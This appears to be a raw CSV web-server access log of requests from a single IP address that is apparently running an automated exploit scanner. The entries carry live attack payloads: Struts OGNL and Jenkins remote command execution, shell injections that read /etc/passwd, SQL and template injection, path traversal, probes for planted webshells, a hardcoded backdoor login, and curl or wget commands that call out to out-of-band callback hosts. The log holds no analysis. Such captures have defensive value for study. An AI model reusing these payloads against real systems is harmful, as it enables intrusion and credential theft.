"uri","query_string","request_ip","method"
"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile","value=@GrabConfig(disableChecksums=true)%250a@GrabResolver(name=%2527test%2527,%2520root=%2527http://aaa%2527)%250a@Grab(group=%2527package%2527,%2520module=%2527vulntest%2527,%2520version=%25271%2527)%250aimport%2520Payload;","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/php/upload.php","-","148.135.107.254","POST"
"/","-","148.135.107.254","OPTIONS"
"/system/sharedir.php","-","148.135.107.254","POST"
"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/test.cgi","-","148.135.107.254","GET"
"/index.action","action%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/en/php/usb_sync.php","-","148.135.107.254","POST"
"/upload","-","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%2573%2565%2572%2576%2569%2563%2565%250a%2573%2573%2568%250a%2564%2569%2573%2561%2562%256c%2565%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/cgi-bin/test-cgi","-","148.135.107.254","GET"
"/wp-admin/options-general.php","page=smartcode","148.135.107.254","POST"
"/debug.cgi","-","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/html/log","-","148.135.107.254","GET"
"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm","-","148.135.107.254","POST"
"/web/google_analytics.php","-","148.135.107.254","POST"
"/ws_utc/resources/setting/options","-","148.135.107.254","POST"
"/soap.cgi","service=whatever-control;curl","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/fuel/pages/select/","filter=%2527%252bpi(print(%2524a%253d%2527system%2527))%252b%2524a(%2527cat%2520/etc/passwd%2527)%252b%2527","148.135.107.254","GET"
"/hw-sys.htm","-","148.135.107.254","GET"
"/anchor/errors.log","-","148.135.107.254","GET"
"/user/register","element_parents=account/mail/%2523value&ajax_form=1&_wrapper_format=drupal_ajax","148.135.107.254","POST"
"/ws_utc/resources/setting/keystore","-","148.135.107.254","POST"
"/","id=nxbMek%2525%7B128*128%7D","148.135.107.254","GET"
"/index.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/login.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/checkValid","-","148.135.107.254","POST"
"/cgi-bin/kerbynet","Action=StartSessionSubmit&User=%27%250acat%2520/etc/passwd%250a%27&PW","148.135.107.254","GET"
"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php","rootUname=%253b%2563%2561%2574%2520%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564%2520%2523","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/Uploads/2Y3PO2OgKFzJQrgNM9HxvSMa1u4.php7","-","148.135.107.254","GET"
"/crowd/plugins/servlet/exp","-","148.135.107.254","GET"
"/ui/api/v1/ui/auth/login","-","148.135.107.254","POST"
"/admin/auth/reset-password","-","148.135.107.254","POST"
"/password_change.cgi","-","148.135.107.254","POST"
"/.%250d./.%250d./.%250d./.%250d./bin/sh","-","148.135.107.254","POST"
"/pages/systemcall.php","command=cat%2520/etc/passwd","148.135.107.254","GET"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/getcfg.php","-","148.135.107.254","POST"
"/query","db=db&q=SHOW%2520DATABASES","148.135.107.254","GET"
"/Admin","-","148.135.107.254","GET"
"/index.action","redirectAction%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/device.rsp","opt=user&cmd=list","148.135.107.254","GET"
"/crowd/admin/uploadplugin.action","-","148.135.107.254","POST"
"/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/QMHtnJRQEc.txt","-","148.135.107.254","GET"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/SWNetPerfMon.db.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/free_time.cgi","-","148.135.107.254","GET"
"/ajax/render/widget_tabbedcontainer_tab_panel","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/adxmlrpc.php","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php","0=id","148.135.107.254","GET"
"/test.txt","-","148.135.107.254","GET"
"/Autodiscover/Autodiscover.xml","-","148.135.107.254","POST"
"/objects/cwnwv.txt","-","148.135.107.254","GET"
"/objects/getImage.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=png","148.135.107.254","GET"
"/service/extdirect","-","148.135.107.254","POST"
"/cgi-bin/file_transfer.cgi","-","148.135.107.254","POST"
"/objects/getImageMP4.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/card_scan.php","No=30&ReaderNo=%2560cat%2520/etc/passwd%2520%253E%2520QMHtnJRQEc.txt%2560","148.135.107.254","GET"
"/web.config.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/ucmdb-api/connect","-","148.135.107.254","GET"
"/console/css/%25252e%25252e%25252fconsole.portal","-","148.135.107.254","POST"
"/api/timelion/run","-","148.135.107.254","POST"
"/webadmin/tools/unixlogin.php","login=admin&password=g%2527%252C%2527%2527%2529%253Bimport%2520os%253Bos.system%2528%25276563686f20224d6c6b7a55453534624778494e326c48546e6845596e46785256706d4f57314a53455a5322207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%2527.decode%2528%2527hex%2527%2529%2529%2523&timeout=5","148.135.107.254","GET"
"/_async/favicon.ico","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/PDC/ajaxreq.php","PARAM=127.0.0.1+-c+0%253B+cat+%252Fetc%252Fpasswd&DIAGNOSIS=PING","148.135.107.254","POST"
"/","id=%2525%257B%2528%2523instancemanager%253D%2523application%255B%2522org.apache.tomcat.InstanceManager%2522%255D%2529.%2528%2523stack%253D%2523attr%255B%2522com.opensymphony.xwork2.util.ValueStack.ValueStack%2522%255D%2529.%2528%2523bean%253D%2523instancemanager.newInstance%2528%2522org.apache.commons.collections.BeanMap%2522%2529%2529.%2528%2523bean.setBean%2528%2523stack%2529%2529.%2528%2523context%253D%2523bean.get%2528%2522context%2522%2529%2529.%2528%2523bean.setBean%2528%2523context%2529%2529.%2528%2523macc%253D%2523bean.get%2528%2522memberAccess%2522%2529%2529.%2528%2523bean.setBean%2528%2523macc%2529%2529.%2528%2523emptyset%253D%2523instancemanager.newInstance%2528%2522java.util.HashSet%2522%2529%2529.%2528%2523bean.put%2528%2522excludedClasses%2522%252C%2523emptyset%2529%2529.%2528%2523bean.put%2528%2522excludedPackageNames%2522%252C%2523emptyset%2529%2529.%2528%2523arglist%253D%2523instancemanager.newInstance%2528%2522java.util.ArrayList%2522%2529%2529.%2528%2523arglist.add%2528%2522cat+%252Fetc%252Fpasswd%2522%2529%2529.%2528%2523execute%253D%2523instancemanager.newInstance%2528%2522freemarker.template.utility.Execute%2522%2529%2529.%2528%2523execute.exec%2528%2523arglist%2529%2529%257D","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/objects/getSpiritsFromVideo.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/_async/AsyncResponseService","-","148.135.107.254","POST"
"/artifactory/ui/auth/login","_spring_security_remember_me=false","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/api/experimental/latest_runs","-","148.135.107.254","GET"
"/lib/crud/userprocess.php","-","148.135.107.254","POST"
"/mailingupgrade.php","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/lib/crud/userprocess.php","-","148.135.107.254","POST"
"/tos/index.php","explorer/pathList&path=%2560curl+http%253a//cl82amo80ssu2h3kcjs09mxyojox1y51j.oast.live+-H+%27User-Agent%253a+YtsR7T%27%2560","148.135.107.254","GET"
"/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/2Y3POWuPeG4NEyV5sD5gRAERKvv.txt","-","148.135.107.254","GET"
"/cgi-bin/system_mgr.cgi","-","148.135.107.254","POST"
"/","pum_action=tools_page_tab_system_info","148.135.107.254","GET"
"/servlet/UploadServlet","-","148.135.107.254","POST"
"/login.php","-","148.135.107.254","GET"
"/tests/support/stores/test_grid_filter.php","query=echo%2520md5%2528%2522CVE-2020-19625%2522%2529%253B","148.135.107.254","GET"
"/","p=1","148.135.107.254","GET"
"/cgi-bin/system_mgr.cgi","C1=ON&cmd=cgi_ntp_time&f_ntp_server=%60curl","148.135.107.254","POST"
"/incom/modules/uploader/showcase/script.php","-","148.135.107.254","POST"
"/q","start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o&ylabel&xrange=10:10&yrange=%5B33:system(%2527wget%2520http://cl82amo80ssu2h3kcjs0zwqp8j534wz48.oast.live%2527)%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json","148.135.107.254","GET"
"/actions/authenticate.php","-","148.135.107.254","POST"
"/console/images/%25252e%25252e%25252fconsole.portal","_nfpb=true&_pageLabel&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%27http://cl82amo80ssu2h3kcjs0nbuhsp76idjw9.oast.live%27)","148.135.107.254","GET"
"/index.php","r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==","148.135.107.254","GET"
"/checkValid","-","148.135.107.254","POST"
"/include/exportUser.php","type=3&cla=application&func=_exec&opt=(cat%2520/etc/passwd)%253Eaxpw.txt","148.135.107.254","GET"
"/ajax/render/widget_tabbedcontainer_tab_panel","-","148.135.107.254","POST"
"/public/index.php/home/index/bind_follow/","publicid=1&is_ajax=1&uid%5B0%5D=exp&uid%5B1%5D=)%2520and%2520updatexml(1,concat(0x7e,md5(%27999999%27),0x7e),1)--++","148.135.107.254","POST"
"/include/axpw.txt","-","148.135.107.254","GET"
"/api/config","-","148.135.107.254","GET"
"/manage/fileDownloader","sec=1","148.135.107.254","GET"
"/include/makecvs.php","Event=%2560curl+http%253a//cl82amo80ssu2h3kcjs0gc4fh43ed7cg9.oast.live+-H+%27User-Agent%253a+YtsR7T%27%2560","148.135.107.254","GET"
"/mifs/.;/services/LogService","-","148.135.107.254","POST"
"/","username=zyfwp&password=PrOw!aN_fXp","148.135.107.254","GET"
"/nette.micro/","callback=shell_exec&cmd=cat%2520/etc/passwd&what=-1","148.135.107.254","GET"
"/run","-","148.135.107.254","POST"
"/var","-","148.135.107.254","POST"
"/webadmin/out","-","148.135.107.254","GET"
"/login.htm","-","148.135.107.254","POST"
"/goform/setSysAdm","-","148.135.107.254","POST"
"/assets/data/usrimg/2y3pofzofrtkcdo63japdmcs2nr.php","-","148.135.107.254","GET"
"/CTCWebService/CTCWebServiceBean/ConfigServlet","-","148.135.107.254","POST"
"/fw.login.php","apikey=%2527UNION%2520select%25201,%2527YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%2527;","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/index.php/catalogsearch/advanced/result/","name=e","148.135.107.254","GET"
"/session/create","-","148.135.107.254","POST"
"/api/jsonws/invoke","-","148.135.107.254","POST"
"/cgi-bin/mainfunction.cgi","-","148.135.107.254","POST"
"/api/jsonws/invoke","-","148.135.107.254","POST"
"/upload","-","148.135.107.254","POST"
"/assets/php/upload.php","-","148.135.107.254","POST"
"/cgi-bin/libagent.cgi","type=J","148.135.107.254","POST"
"/index.php","app=main&inc=core_auth&route=login","148.135.107.254","GET"
"/","app=main&inc=core_auth&route=login","148.135.107.254","GET"
"/+CSCOE+/session_password.html","-","148.135.107.254","GET"
"/server/","-","148.135.107.254","GET"
"/wp-content/plugins/quiz-master-next/README.md","-","148.135.107.254","GET"
"/EemAdminService/EemAdmin","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","author=1","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/ext-js/index.html","-","148.135.107.254","GET"
"/%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BFd%25B8%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs09gza5uwwttw8e.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BFd%25B8%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0s6unmdx89rhq1.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/hsqldb%250a","-","148.135.107.254","GET"
"/lucee/admin/imgProcess.cfm","file=/whatever","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/lucee/admin/imgProcess.cfm","file=/../../../context/2Y3POXLhU3Ype6n61GFEPmnLeiG.cfm","148.135.107.254","POST"
"/ui/vropspluginui/rest/services/getstatus","-","148.135.107.254","GET"
"/logupload","logMetaData=%257B%2522itrLogPath%2522%253A%2520%2522..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhttpd%252Fhtml%252Fwsgi_log_upload%2522%252C%2520%2522logFileType%2522%253A%2520%2522log_upload_wsgi.py%2522%252C%2520%2522workloadID%2522%253A%2520%25222%2522%257D","148.135.107.254","POST"
"/cgi-bin/weblogin.cgi","username=admin%27;cat+/etc/passwd","148.135.107.254","GET"
"/actions/seomatic/meta-container/meta-link-container/","uri=%7B%7B228*%2798%27%7D%7D","148.135.107.254","GET"
"/%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BF%2508%25B7%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0mn8jo18zzw36e.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BF%2508%25B7%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0nribq97d8c6sp.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","148.135.107.254","GET"
"/cgi-bin/mt/mt-xmlrpc.cgi","-","148.135.107.254","POST"
"/actions/seomatic/meta-container/all-meta-containers","uri=%7B%7B228*%2798%27%7D%7D","148.135.107.254","GET"
"/php/ping.php","hostname=%7Cdir","148.135.107.254","GET"
"/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData","-","148.135.107.254","POST"
"/AdminService/urest/v1/LogonResource","-","148.135.107.254","POST"
"/api/v1/method.callAnon/getPasswordPolicy","-","148.135.107.254","POST"
"/linuxki/experimental/vis/kivis.php","type=kitrace&pid=0;echo%2520START;cat%2520/etc/passwd;echo%2520END;","148.135.107.254","GET"
"/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php","-","148.135.107.254","GET"
"/wp-admin/admin.php","page=contest-gallery/index.php&users_management=true&option_id=1","148.135.107.254","POST"
"/wp-content/plugins/imagements/images/2y3pnmtakvl4cl8baockwhbqftv.php","-","148.135.107.254","GET"
"/wp-admin/index.php","-","148.135.107.254","GET"
"/storfs-asup","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/Schemas/$%257B%2527%2527.class.forName%2528%2527javax.script.ScriptEngineManager%2527%2529.newInstance%2528%2529.getEngineByName%2528%2527js%2527%2529.eval%2528%2527java.lang.Runtime.getRuntime%2528%2529.exec%2528%2522id%2522%2529%2527%2529%257D","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=uploadFontIcon","148.135.107.254","POST"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/wp-content/plugins/wpcargo/includes/2Y3POP2JbJMtB8efEohjuZ6nitb.php","-","148.135.107.254","GET"
"/analytics/telemetry/ph/api/hyper/send","_c&_i=test","148.135.107.254","POST"
"/run","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wp-content/uploads/kaswara/fonts_icon/ohjtqg/am.php","-","148.135.107.254","GET"
"/test.txt%250d%250aSet-Cookie:CRLFInjection=Test%250d%250aLocation:%2520interact.sh%250d%250aX-XSS-Protection:0","-","148.135.107.254","GET"
"/wp-content/plugins/wpcargo/includes/2Y3POP2JbJMtB8efEohjuZ6nitb.php","1=var_dump","148.135.107.254","POST"
"/premise/front/getPingData","url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;","148.135.107.254","GET"
"/cgi-bin/cgiServer","worker=IndexNew","148.135.107.254","GET"
"/lucee/2Y3POXLhU3Ype6n61GFEPmnLeiG.cfm","-","148.135.107.254","POST"
"/wp-comments-post.php","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/wp-content/uploads/workreap-temp/2Y3POSPz1qllieScBGwiww8bBdo.php","-","148.135.107.254","GET"
"/webtools/control/SOAPService","-","148.135.107.254","POST"
"/assets/app/something/services/AppModule.class/","-","148.135.107.254","GET"
"/prweb/PRAuth/app/default/","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/wp-content/plugins/wpcargo/includes/barcode.php","text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=2Y3POP2JbJMtB8efEohjuZ6nitb.php","148.135.107.254","GET"
"/redfish/v1/SessionService/ResetPassword/1/","-","148.135.107.254","PATCH"
"/goform/setmac","-","148.135.107.254","POST"
"/users/sign_in","-","148.135.107.254","GET"
